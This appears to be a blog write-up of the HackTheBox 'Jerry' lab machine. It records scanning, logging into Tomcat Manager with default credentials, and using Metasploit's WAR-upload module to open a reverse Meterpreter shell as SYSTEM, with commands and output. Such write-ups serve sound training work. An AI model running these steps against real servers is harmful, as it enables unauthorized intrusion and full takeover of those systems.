+++
title = "HackTheBox - Jerry Writeup"
date = "2026-04-07"
description = "Apache Tomcatのデフォルト認証情報を悪用してSYSTEM権限を取得する"
tags = ["HackTheBox", "CTF", "Windows", "Apache Tomcat", "Default Credentials", "Metasploit", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Jerry |
| OS | Windows |

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sV 10.129.136.9
```
```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

### Directory Enumeration
```bash
gobuster dir -u http://10.129.136.9:8080/ -w /usr/share/wordlists/dirb/common.txt
```
```text
docs         (Status: 302) [--> /docs/]
examples     (Status: 302) [--> /examples/]
host-manager (Status: 302) [--> /host-manager/]
manager      (Status: 302) [--> /manager/]
```

---

## Initial Access — Tomcat Manager

ブラウザで `http://10.129.136.9:8080/manager/html` にアクセス。
Basic認証ダイアログが表示される。

`admin/admin` を試すと401エラーのレスポンスにデフォルト認証情報の例が記載されており、`tomcat/s3cret` でログイン成功。
```text
Username: tomcat
Password: s3cret
```

---

## Payload Generation

Metasploitの `tomcat_mgr_upload` モジュールを使用するため手動生成は不要。

---

## Upload / Delivery
```bash
use exploit/multi/http/tomcat_mgr_upload

set HttpUsername tomcat
set HttpPassword s3cret
set RHOSTS 10.129.136.9
set RPORT 8080
set LHOST 10.10.16.166
set LPORT 5555
```

モジュールが自動的にWARファイルを生成・アップロード・デプロイする。

---

## Trigger
```bash
run
```
```text
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying ssb0PGb05AlZrJlYdhuj1Zrl4...
[*] Executing ssb0PGb05AlZrJlYdhuj1Zrl4...
[*] Sending stage (58073 bytes) to 10.129.136.9
[*] Undeploying ssb0PGb05AlZrJlYdhuj1Zrl4 ...
```

---

## Listener
```bash
run
```
```text
[*] Started reverse TCP handler on 10.10.16.166:5555
[*] Meterpreter session 1 opened (10.10.16.166:5555 -> 10.129.136.9:49192)
```

---

## Foothold
```bash
getuid
```
```text
Server username: JERRY$
```

---

## System Info
```bash
shell
systeminfo
```
```text
OS Name: Microsoft Windows Server 2012 R2 Standard
OS Version: 6.3.9600
```

---

## Post Exploitation
```bash
shell
cd C:\Users\Administrator\Desktop\flags
dir
```
```text
06/19/2018  07:11 AM    88    2 for the price of 1.txt
```

---

## Results

- Apache Tomcat 7.0.88 稼働
- Tomcat Manager がデフォルト認証情報で公開
- TomcatプロセスがSYSTEM権限で実行中

---

## Privilege Escalation

不要。TomcatがすでにSYSTEM権限で動作しているため初期侵入時点でSYSTEM取得済み。

---

## SYSTEM Shell
```bash
getuid
```
```text
Server username: JERRY$
```
```cmd
whoami
```
```text
nt authority\system
```

---

## Flags

### User & Root（2 for the price of 1）
```cmd
type "2 for the price of 1.txt"
```
```text
user.txt : [user_flag]
root.txt : [root_flag]
```

---

## Summary

Tomcat Manager デフォルト認証情報 (`tomcat:s3cret`) → WAR デプロイによるリモートコード実行 → TomcatがSYSTEM権限で動作しているため特権昇格不要 → フラグ取得